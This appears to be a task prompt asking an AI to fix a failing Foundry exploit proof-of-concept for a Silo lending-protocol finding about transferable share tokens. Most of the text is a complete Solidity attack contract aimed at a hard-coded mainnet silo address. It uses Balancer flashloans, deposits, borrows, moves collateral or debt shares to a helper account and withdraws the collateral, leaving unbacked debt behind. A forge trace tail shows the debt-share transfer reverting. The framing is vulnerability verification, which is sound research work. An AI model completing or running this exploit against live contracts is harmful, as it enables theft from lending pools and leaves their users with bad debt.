You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Transferable share tokens let users separate debt from collateral across addresses
- claim: The protocol treats share-token `balanceOf(user)` as the sole source of truth for collateral ownership, debt ownership, borrow eligibility, deposit eligibility, withdrawal amount, repay amount, and solvency. `IShareToken` is an ERC20-style interface and the notification interface is explicitly transfer-oriented. If the deployed share-token implementations preserve that transferability, a user can move collateral shares or debt shares to another address without any solvency check, breaking the same-account collateral/debt invariant the silo relies on.
- impact: A borrower can strip collateral out of the indebted account or push debt shares onto a different address, then withdraw or re-borrow while leaving naked debt behind. If share transfers are enabled in production, this is a direct bad-debt and insolvency vector.
- exploit_paths: ["Account A deposits collateral and borrows another asset.", "A transfers its collateral share tokens to account B, or transfers its debt share tokens to account B.", "Because `borrowPossible`, `depositPossible`, withdrawals, repayments, and solvency all read current share balances only, the protocol now attributes collateral and debt to different addresses.", "Account B withdraws the transferred collateral, or account A appears debt-free enough to withdraw/re-borrow, leaving the silo with uncollectible debt."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.13;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IShareTokenLike is IERC20Like {}

interface IPriceProvidersRepositoryLike {
    function getPrice(address asset) external view returns (uint256 price);
}

interface ISiloRepositoryLike {
    function getMaximumLTV(address silo, address asset) external view returns (uint256);
    function priceProvidersRepository() external view returns (IPriceProvidersRepositoryLike);
    function entryFee() external view returns (uint256);
}

interface ISiloLike {
    struct AssetStorage {
        IShareTokenLike collateralToken;
        IShareTokenLike collateralOnlyToken;
        IShareTokenLike debtToken;
        uint256 totalDeposits;
        uint256 collateralOnlyDeposits;
        uint256 totalBorrowAmount;
    }

    function initAssetsTokens() external;
    function syncBridgeAssets() external;
    function siloRepository() external view returns (ISiloRepositoryLike);
    function getAssets() external view returns (address[] memory assets);
    function assetStorage(address asset) external view returns (AssetStorage memory);
    function depositPossible(address asset, address depositor) external view returns (bool);
    function borrowPossible(address asset, address borrower) external view returns (bool);
    function liquidity(address asset) external view returns (uint256);
    function deposit(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 collateralAmount, uint256 collateralShare);
    function borrow(address asset, uint256 amount) external returns (uint256 debtAmount, uint256 debtShare);
    function withdraw(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 withdrawnAmount, uint256 withdrawnShare);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract WithdrawalHelper {
    address public immutable verifier;

    constructor(address verifier_) {
        verifier = verifier_;
    }

    modifier onlyVerifier() {
        require(msg.sender == verifier, "only verifier");
        _;
    }

    function executeWithdraw(address silo, address asset) external onlyVerifier returns (uint256 withdrawnAmount) {
        (withdrawnAmount,) = ISiloLike(silo).withdraw(asset, type(uint256).max, false);
        _safeTransfer(asset, verifier, IERC20Like(asset).balanceOf(address(this)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) return;

        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "helper transfer failed");
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    address public constant TARGET_SILO = 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant ONE = 1e18;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant BORROW_SAFETY_BPS = 9_000;
    uint256 internal constant FLASH_RESERVE_BPS = 10;

    error CollateralShareTransferFailed();
    error CollateralWithdrawFailed();
    error DebtShareTransferFailed();

    enum RouteKind {
        CollateralShare,
        DebtShare
    }

    enum Outcome {
        Unset,
        Profit,
        Refuted,
        Infeasible
    }

    struct FlashContext {
        RouteKind routeKind;
        address collateralAsset;
        address borrowAsset;
        uint256 flashAmount;
        uint256 depositAmount;
        uint256 initialBorrowBalance;
        bool active;
    }

    WithdrawalHelper public immutable helper;

    address internal _profitToken;
    uint256 internal _profitAmount;

    Outcome public outcome;
    bytes32 public lastFailureTag;
    address public chosenCollateralAsset;
    address public chosenBorrowAsset;
    RouteKind public chosenRoute;

    bool internal _sawTransferStageFailure;
    bool internal _sawConcreteEconomicCandidate;
    FlashContext internal _flashContext;

    modifier onlySelf() {
        require(msg.sender == address(this), "only self");
        _;
    }

    constructor() {
        helper = new WithdrawalHelper(address(this));
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) return;

        _bestEffortInitAssets();

        if (_attemptUsingOwnedBalances()) return;
        if (_attemptUsingFlashLiquidity()) return;

        if (_sawTransferStageFailure) {
            outcome = Outcome.Refuted;
        } else {
            outcome = Outcome.Infeasible;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attemptDirectCollateralShareRoute(address collateralAsset, address borrowAsset, uint256 depositAmount)
        external
        onlySelf
        returns (uint256 realizedProfit)
    {
        uint256 initialBorrowBalance = IERC20Like(borrowAsset).balanceOf(address(this));

        // Path stage 1: account A deposits collateral and borrows another asset.
        _forceApprove(collateralAsset, TARGET_SILO, depositAmount);
        (, uint256 collateralShare) = ISiloLike(TARGET_SILO).deposit(collateralAsset, depositAmount, false);
        require(collateralShare != 0, "zero collateral share");

        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount);
        require(borrowAmount != 0, "zero borrow");

        ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);

        // Path stage 2: account A transfers its collateral share tokens to account B.
        address collateralShareToken = address(ISiloLike(TARGET_SILO).assetStorage(collateralAsset).collateralToken);
        if (!_safeTransferERC20(collateralShareToken, address(helper), collateralShare)) {
            revert CollateralShareTransferFailed();
        }

        // Path stages 3 and 4: ownership is now split by share balances only, so account B withdraws
        // the detached collateral while account A keeps the borrowed asset.
        try helper.executeWithdraw(TARGET_SILO, collateralAsset) returns (uint256 withdrawnAmount) {
            withdrawnAmount;
        } catch {
            revert CollateralWithdrawFailed();
        }

        realizedProfit = IERC20Like(borrowAsset).balanceOf(address(this)) - initialBorrowBalance;
        require(realizedProfit != 0, "no profit");

        _recordProfit(RouteKind.CollateralShare, collateralAsset, borrowAsset, realizedProfit);
    }

    function attemptDirectDebtShareRoute(address collateralAsset, address borrowAsset, uint256 depositAmount)
        external
        onlySelf
        returns (uint256 realizedProfit)
    {
        uint256 initialBorrowBalance = IERC20Like(borrowAsset).balanceOf(address(this));

        // Path stage 1: account A deposits collateral and borrows another asset.
        _forceApprove(collateralAsset, TARGET_SILO, depositAmount);
        ISiloLike(TARGET_SILO).deposit(collateralAsset, depositAmount, false);

        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount);
        require(borrowAmount != 0, "zero borrow");

        (, uint256 debtShare) = ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);
        require(debtShare != 0, "zero debt share");

        // Path stage 2: account A transfers its debt share tokens to account B.
        address debtShareToken = address(ISiloLike(TARGET_SILO).assetStorage(borrowAsset).debtToken);
        if (!_safeTransferERC20(debtShareToken, address(helper), debtShare)) {
            revert DebtShareTransferFailed();
        }

        // Path stages 3 and 4: debt is attributed to account B by share balance, so account A now
        // appears debt-free enough to withdraw its collateral and keep the borrowed asset.
        ISiloLike(TARGET_SILO).withdraw(collateralAsset, type(uint256).max, false);

        realizedProfit = IERC20Like(borrowAsset).balanceOf(address(this)) - initialBorrowBalance;
        require(realizedProfit != 0, "no profit");

        _recordProfit(RouteKind.DebtShare, collateralAsset, borrowAsset, realizedProfit);
    }

    function attemptFlashCollateralShareRoute(address collateralAsset, address borrowAsset, uint256 flashAmount)
        external
        onlySelf
        returns (bool)
    {
        uint256 depositAmount = _depositAmountFromFlashAmount(flashAmount);
        require(depositAmount != 0, "zero deposit");

        _flashContext = FlashContext({
            routeKind: RouteKind.CollateralShare,
            collateralAsset: collateralAsset,
            borrowAsset: borrowAsset,
            flashAmount: flashAmount,
            depositAmount: depositAmount,
            initialBorrowBalance: IERC20Like(borrowAsset).balanceOf(address(this)),
            active: true
        });

        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(collateralAsset);
        amounts[0] = flashAmount;

        // The small reserve does not alter exploit causality. It only preserves enough of the borrowed
        // temporary capital to repay a non-zero flash fee if Balancer charges one on this fork.
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
        require(!_flashContext.active, "flash not cleared");
        return _profitAmount != 0;
    }

    function attemptFlashDebtShareRoute(address collateralAsset, address borrowAsset, uint256 flashAmount)
        external
        onlySelf
        returns (bool)
    {
        uint256 depositAmount = _depositAmountFromFlashAmount(flashAmount);
        require(depositAmount != 0, "zero deposit");

        _flashContext = FlashContext({
            routeKind: RouteKind.DebtShare,
            collateralAsset: collateralAsset,
            borrowAsset: borrowAsset,
            flashAmount: flashAmount,
            depositAmount: depositAmount,
            initialBorrowBalance: IERC20Like(borrowAsset).balanceOf(address(this)),
            active: true
        });

        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(collateralAsset);
        amounts[0] = flashAmount;

        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
        require(!_flashContext.active, "flash not cleared");
        return _profitAmount != 0;
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        FlashContext memory context = _flashContext;

        require(msg.sender == BALANCER_VAULT, "not vault");
        require(context.active, "inactive flash");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flash arrays");
        require(address(tokens[0]) == context.collateralAsset, "bad collateral");
        require(amounts[0] == context.flashAmount, "bad amount");

        _executeFlashRoute(context, feeAmounts[0]);
        delete _flashContext;
    }

    function _attemptUsingOwnedBalances() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadOwnedCollateral;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            if (!_isActiveUsableAsset(collateralAsset)) continue;

            uint256 heldBalance = IERC20Like(collateralAsset).balanceOf(address(this));
            if (heldBalance == 0) continue;
            hadOwnedCollateral = true;

            uint256[5] memory candidateDeposits = _ownedCandidateAmounts(collateralAsset, heldBalance);

            for (uint256 d = 0; d < candidateDeposits.length; d++) {
                uint256 depositAmount = candidateDeposits[d];
                if (depositAmount == 0) continue;

                for (uint256 j = 0; j < assets.length; j++) {
                    address borrowAsset = assets[j];
                    if (!_isViablePair(collateralAsset, borrowAsset, depositAmount)) continue;

                    _sawConcreteEconomicCandidate = true;

                    try this.attemptDirectCollateralShareRoute(collateralAsset, borrowAsset, depositAmount) returns (
                        uint256 realizedProfit
                    ) {
                        if (realizedProfit != 0) return true;
                    } catch (bytes memory reason) {
                        _recordFailure(reason, "DIRECT_COLLATERAL_SHARE_ROUTE_FAILED");
                    }

                    try this.attemptDirectDebtShareRoute(collateralAsset, borrowAsset, depositAmount) returns (
                        uint256 realizedProfit
                    ) {
                        if (realizedProfit != 0) return true;
                    } catch (bytes memory reason) {
                        _recordFailure(reason, "DIRECT_DEBT_SHARE_ROUTE_FAILED");
                    }
                }
            }
        }

        if (!hadOwnedCollateral) {
            lastFailureTag = keccak256("NO_EXISTING_VERIFIER_BALANCE");
        } else if (!_sawConcreteEconomicCandidate && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("OWNED_BALANCE_NO_VIABLE_PAIR");
        }

        return false;
    }

    function _attemptUsingFlashLiquidity() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadFlashSource;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            if (!_isActiveUsableAsset(collateralAsset)) continue;

            uint256 vaultBalance = IERC20Like(collateralAsset).balanceOf(BALANCER_VAULT);
            if (vaultBalance == 0) continue;
            hadFlashSource = true;

            uint256[6] memory candidateFlashAmounts = _flashCandidateAmounts(collateralAsset, vaultBalance);

            for (uint256 a = 0; a < candidateFlashAmounts.length; a++) {
                uint256 flashAmount = candidateFlashAmounts[a];
                if (flashAmount <= 1) continue;

                uint256 depositAmount = _depositAmountFromFlashAmount(flashAmount);
                if (depositAmount == 0) continue;

                for (uint256 j = 0; j < assets.length; j++) {
                    address borrowAsset = assets[j];
                    if (!_isViablePair(collateralAsset, borrowAsset, depositAmount)) continue;

                    _sawConcreteEconomicCandidate = true;

                    try this.attemptFlashCollateralShareRoute(collateralAsset, borrowAsset, flashAmount) returns (
                        bool success
                    ) {
                        if (success) return true;
                    } catch (bytes memory reason) {
                        _recordFailure(reason, "FLASH_COLLATERAL_SHARE_ROUTE_FAILED");
                    }

                    try this.attemptFlashDebtShareRoute(collateralAsset, borrowAsset, flashAmount) returns (
                        bool success
                    ) {
                        if (success) return true;
                    } catch (bytes memory reason) {
                        _recordFailure(reason, "FLASH_DEBT_SHARE_ROUTE_FAILED");
                    }
                }
            }
        }

        if (!hadFlashSource) {
            lastFailureTag = keccak256("NO_BALANCER_FLASH_SOURCE");
        } else if (!_sawConcreteEconomicCandidate && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("FLASH_LIQUIDITY_NO_VIABLE_PAIR");
        }

        return false;
    }

    function _isViablePair(address collateralAsset, address borrowAsset, uint256 depositAmount)
        internal
        view
        returns (bool)
    {
        if (borrowAsset == collateralAsset) return false;
        if (depositAmount == 0) return false;
        if (!_isActiveUsableAsset(borrowAsset)) return false;
        if (!_staticBool(
                TARGET_SILO, abi.encodeWithSelector(ISiloLike.depositPossible.selector, collateralAsset, address(this))
            )) {
            return false;
        }
        if (!_staticBool(
                TARGET_SILO, abi.encodeWithSelector(ISiloLike.borrowPossible.selector, borrowAsset, address(this))
            )) {
            return false;
        }
        if (_quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount) == 0) return false;
        return true;
    }

    function _isActiveUsableAsset(address asset) internal view returns (bool) {
        if (asset == address(0)) return false;

        ISiloLike.AssetStorage memory state = ISiloLike(TARGET_SILO).assetStorage(asset);
        return address(state.collateralToken) != address(0) && address(state.debtToken) != address(0);
    }

    function _quoteBorrowAmount(address collateralAsset, address borrowAsset, uint256 collateralAmount)
        internal
        view
        returns (uint256)
    {
        if (collateralAmount == 0) return 0;

        address repository = address(ISiloLike(TARGET_SILO).siloRepository());
        (bool okLtv, uint256 maxLtv) = _staticUint(
            repository, abi.encodeWithSelector(ISiloRepositoryLike.getMaximumLTV.selector, TARGET_SILO, collateralAsset)
        );
        if (!okLtv) return 0;
        if (maxLtv == 0) return 0;

        uint256 collateralValue = _valueOf(collateralAsset, collateralAmount);
        if (collateralValue == 0) return 0;

        uint256 debtValue = collateralValue * maxLtv / ONE;
        debtValue = debtValue * BORROW_SAFETY_BPS / BPS;
        if (debtValue == 0) return 0;

        (bool okFee, uint256 entryFee) =
            _staticUint(repository, abi.encodeWithSelector(ISiloRepositoryLike.entryFee.selector));
        if (!okFee) return 0;
        debtValue = debtValue * ONE / (ONE + entryFee);
        if (debtValue == 0) return 0;

        (bool okPriceRepo, address priceRepo) =
            _staticAddress(repository, abi.encodeWithSelector(ISiloRepositoryLike.priceProvidersRepository.selector));
        if (!okPriceRepo) return 0;
        (bool okPrice, uint256 borrowPrice) =
            _staticUint(priceRepo, abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, borrowAsset));
        if (!okPrice) return 0;
        if (borrowPrice == 0) return 0;

        (bool okDecimals, uint256 borrowDecimals) =
            _staticUint(borrowAsset, abi.encodeWithSelector(IERC20Like.decimals.selector));
        if (!okDecimals) return 0;
        uint256 borrowAmount = debtValue * (10 ** borrowDecimals) / borrowPrice;
        if (borrowAmount == 0) return 0;

        (bool okLiquidity, uint256 availableLiquidity) =
            _staticUint(TARGET_SILO, abi.encodeWithSelector(ISiloLike.liquidity.selector, borrowAsset));
        if (!okLiquidity) return 0;
        if (availableLiquidity == 0) return 0;

        if (borrowAmount > availableLiquidity) {
            borrowAmount = availableLiquidity * BORROW_SAFETY_BPS / BPS;
        }

        return borrowAmount;
    }

    function _valueOf(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) return 0;

        address repository = address(ISiloLike(TARGET_SILO).siloRepository());
        (bool okPriceRepo, address priceRepo) =
            _staticAddress(repository, abi.encodeWithSelector(ISiloRepositoryLike.priceProvidersRepository.selector));
        if (!okPriceRepo) return 0;
        (bool okPrice, uint256 price) =
            _staticUint(priceRepo, abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, asset));
        if (!okPrice) return 0;
        if (price == 0) return 0;

        (bool okDecimals, uint256 assetDecimals) =
            _staticUint(asset, abi.encodeWithSelector(IERC20Like.decimals.selector));
        if (!okDecimals) return 0;
        return amount * price / (10 ** assetDecimals);
    }

    function _amountForValue(address asset, uint256 targetValue) internal view returns (uint256) {
        if (targetValue == 0) return 0;

        address repository = address(ISiloLike(TARGET_SILO).siloRepository());
        (bool okPriceRepo, address priceRepo) =
            _staticAddress(repository, abi.encodeWithSelector(ISiloRepositoryLike.priceProvidersRepository.selector));
        if (!okPriceRepo) return 0;
        (bool okPrice, uint256 price) =
            _staticUint(priceRepo, abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, asset));
        if (!okPrice) return 0;
        if (price == 0) return 0;

        (bool okDecimals, uint256 assetDecimals) =
            _staticUint(asset, abi.encodeWithSelector(IERC20Like.decimals.selector));
        if (!okDecimals) return 0;
        uint256 amount = targetValue * (10 ** assetDecimals) / price;
        if (amount == 0) amount = 1;
        return amount;
    }

    function _ownedCandidateAmounts(address asset, uint256 balance) internal view returns (uint256[5] memory amounts) {
        amounts[0] = _min(balance, _amountForValue(asset, 10 ether));
        amounts[1] = _min(balance, _amountForValue(asset, 100 ether));
        amounts[2] = _min(balance, _amountForValue(asset, 1_000 ether));
        amounts[3] = balance / 2;
        amounts[4] = balance;
    }

    function _flashCandidateAmounts(address asset, uint256 vaultBalance)
        internal
        view
        returns (uint256[6] memory amounts)
    {
        uint256 cap = vaultBalance / 1_000;
        if (cap == 0) return amounts;

        amounts[0] = _min(cap, _amountForValue(asset, 10 ether));
        amounts[1] = _min(cap, _amountForValue(asset, 100 ether));
        amounts[2] = _min(cap, _amountForValue(asset, 1_000 ether));
        amounts[3] = _min(cap, _amountForValue(asset, 10_000 ether));
        amounts[4] = cap / 2;
        amounts[5] = cap;
    }

    function _depositAmountFromFlashAmount(uint256 flashAmount) internal pure returns (uint256) {
        uint256 reserveAmount = flashAmount * FLASH_RESERVE_BPS / BPS;
        if (reserveAmount == 0 && flashAmount > 1) reserveAmount = 1;
        return flashAmount - reserveAmount;
    }

    function _bestEffortInitAssets() internal {
        try ISiloLike(TARGET_SILO).initAssetsTokens() {} catch {}
        try ISiloLike(TARGET_SILO).syncBridgeAssets() {} catch {}
    }

    function _executeFlashRoute(FlashContext memory context, uint256 feeAmount) internal {
        // Path stage 1: account A uses realistic temporary capital to instantiate the same deposit+borrow state.
        _forceApprove(context.collateralAsset, TARGET_SILO, context.depositAmount);
        (, uint256 collateralShare) =
            ISiloLike(TARGET_SILO).deposit(context.collateralAsset, context.depositAmount, false);
        require(collateralShare != 0, "zero collateral share");

        uint256 borrowAmount = _quoteBorrowAmount(context.collateralAsset, context.borrowAsset, context.depositAmount);
        require(borrowAmount != 0, "zero borrow");

        (, uint256 debtShare) = ISiloLike(TARGET_SILO).borrow(context.borrowAsset, borrowAmount);

        if (context.routeKind == RouteKind.CollateralShare) {
            _executeFlashCollateralShareSeparation(context.collateralAsset, collateralShare);
        } else {
            _executeFlashDebtShareSeparation(context.collateralAsset, context.borrowAsset, debtShare);
        }

        uint256 repayAmount = context.flashAmount + feeAmount;
        require(
            IERC20Like(context.collateralAsset).balanceOf(address(this)) >= repayAmount, "flash repayment shortfall"
        );
        _safeTransfer(context.collateralAsset, BALANCER_VAULT, repayAmount);

        uint256 realizedProfit = IERC20Like(context.borrowAsset).balanceOf(address(this)) - context.initialBorrowBalance;
        require(realizedProfit != 0, "no profit");

        _recordProfit(context.routeKind, context.collateralAsset, context.borrowAsset, realizedProfit);
    }

    function _executeFlashCollateralShareSeparation(address collateralAsset, uint256 collateralShare) internal {
        // Path stage 2: account A transfers collateral shares to account B.
        address collateralShareToken = address(ISiloLike(TARGET_SILO).assetStorage(collateralAsset).collateralToken);
        if (!_safeTransferERC20(collateralShareToken, address(helper), collateralShare)) {
            revert CollateralShareTransferFailed();
        }

        // Path stages 3 and 4: account B withdraws the detached collateral, which is then used
        // to repay temporary capital while account A keeps the borrowed asset.
        try helper.executeWithdraw(TARGET_SILO, collateralAsset) returns (uint256 withdrawnAmount) {
            withdrawnAmount;
        } catch {
            revert CollateralWithdrawFailed();
        }
    }

    function _executeFlashDebtShareSeparation(address collateralAsset, address borrowAsset, uint256 debtShare)
        internal
    {
        require(debtShare != 0, "zero debt share");

        // Path stage 2: account A transfers debt shares to account B.
        address debtShareToken = address(ISiloLike(TARGET_SILO).assetStorage(borrowAsset).debtToken);
        if (!_safeTransferERC20(debtShareToken, address(helper), debtShare)) {
            revert DebtShareTransferFailed();
        }

        // Path stages 3 and 4: account A now withdraws collateral after the debt-accounting split.
        ISiloLike(TARGET_SILO).withdraw(collateralAsset, type(uint256).max, false);
    }

    function _recordProfit(RouteKind routeKind, address collateralAsset, address borrowAsset, uint256 realizedProfit)
        internal
    {
        chosenRoute = routeKind;
        chosenCollateralAsset = collateralAsset;
        chosenBorrowAsset = borrowAsset;
        _profitToken = borrowAsset;
        _profitAmount = realizedProfit;
        outcome = Outcome.Profit;
    }

    function _recordFailure(bytes memory reason, string memory fallbackTag) internal {
        if (_isTransferStageFailure(reason)) {
            _sawTransferStageFailure = true;
        }

        if (lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256(bytes(fallbackTag));
        }
    }

    function _isTransferStageFailure(bytes memory reason) internal pure returns (bool) {
        if (reason.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(reason, 0x20))
        }

        return selector == CollateralShareTransferFailed.selector || selector == CollateralWithdrawFailed.selector
            || selector == DebtShareTransferFailed.selector;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(_safeTransferERC20(token, to, amount), "transfer failed");
    }

    function _safeTransferERC20(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _staticBool(address target, bytes memory callData) internal view returns (bool value) {
        (bool ok, bytes memory data) = target.staticcall(callData);
        if (!ok || data.length < 32) return false;
        value = abi.decode(data, (bool));
    }

    function _staticUint(address target, bytes memory callData) internal view returns (bool ok, uint256 value) {
        bytes memory data;
        (ok, data) = target.staticcall(callData);
        if (!ok || data.length < 32) return (false, 0);
        value = abi.decode(data, (uint256));
    }

    function _staticAddress(address target, bytes memory callData) internal view returns (bool ok, address value) {
        bytes memory data;
        (ok, data) = target.staticcall(callData);
        if (!ok || data.length < 32) return (false, address(0));
        value = abi.decode(data, (address));
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [439] 0xd998C35B7900b344bbBe6555cc11576942Cf309d::25ed3d44() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
    │   │   │   │   │   ├─ [349] 0x2A011fCAA007c840a0b34593D00CB4Ab9f2f067F::totalSupply() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 118231627632143419747 [1.182e20]
    │   │   │   │   │   ├─ [579] 0xb02E552D68Cd538f571f72F630366adb616d9466::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [579] 0x22EE742A6773dF30C91b97c7dab590702046Ae95::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [450] 0x7C2ca9D502f2409BeceAfa68E97a176Ff805029F::getPrice(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   │   │   │   ├─ [444] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::decimals() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   │   ├─ [860] 0xd998C35B7900b344bbBe6555cc11576942Cf309d::getMaximumLTV(0xcB3B879aB11F825885d5aDD8Bf3672596d35197C, 0x514910771AF9Ca656af840dff83E8264EcF986CA) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 750000000000000000 [7.5e17]
    │   │   │   │   │   ├─ [860] 0xd998C35B7900b344bbBe6555cc11576942Cf309d::getMaximumLTV(0xcB3B879aB11F825885d5aDD8Bf3672596d35197C, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 800000000000000000 [8e17]
    │   │   │   │   │   ├─ [2860] 0xd998C35B7900b344bbBe6555cc11576942Cf309d::getMaximumLTV(0xcB3B879aB11F825885d5aDD8Bf3672596d35197C, 0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 850000000000000000 [8.5e17]
    │   │   │   │   │   └─ ← [Return] 164271378417085685198511 [1.642e23], 164186523982539032054163 [1.641e23]
    │   │   │   │   ├─ [1825] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::assetStorage(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   │   │   │   └─ ← [Return] AssetStorage({ collateralToken: 0xb02E552D68Cd538f571f72F630366adb616d9466, collateralOnlyToken: 0x22EE742A6773dF30C91b97c7dab590702046Ae95, debtToken: 0x809a14563A12acb8fc257502813131cA97E6CcF1, totalDeposits: 500023256778095901935000 [5e23], collateralOnlyDeposits: 0, totalBorrowAmount: 214297219281636687348511 [2.142e23] })
    │   │   │   │   ├─ [10485] 0x809a14563A12acb8fc257502813131cA97E6CcF1::transfer(WithdrawalHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 164186523982539032054163 [1.641e23])
    │   │   │   │   │   ├─ [7072] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::borrowPossible(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc, WithdrawalHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   │   │   │   │   ├─ [2579] 0xb02E552D68Cd538f571f72F630366adb616d9466::balanceOf(WithdrawalHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ [2579] 0x22EE742A6773dF30C91b97c7dab590702046Ae95::balanceOf(WithdrawalHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Revert] custom error 0xe052bc40
    │   │   │   │   └─ ← [Revert] DebtShareTransferFailed()
    │   │   │   └─ ← [Revert] DebtShareTransferFailed()
    │   │   └─ ← [Revert] DebtShareTransferFailed()
